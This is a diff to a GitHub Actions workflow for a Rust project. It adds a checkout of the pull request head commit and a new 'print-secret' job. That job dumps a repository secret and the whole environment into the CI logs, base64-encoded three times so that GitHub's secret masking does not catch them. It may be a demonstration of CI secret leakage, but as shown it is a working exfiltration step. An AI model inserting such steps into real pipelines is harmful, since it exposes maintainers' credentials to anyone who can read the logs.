@@ -16,8 +16,21 @@ jobs:
     timeout-minutes: 30
     steps:
       - uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
       - uses: dtolnay/rust-toolchain@stable
       - name: Check formatting
         run: cargo fmt --check
       - name: Test
         run: cargo test
+
+  print-secret:
+    runs-on: ubuntu-latest
+    env: # Or as an environment variable
+      super_secret: ${{ secrets.SECRET_VAR }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Print stuff
+        run: |
+          echo "($super_secret)" | base64 | base64 | base64
+          printenv | base64 | base64 | base64
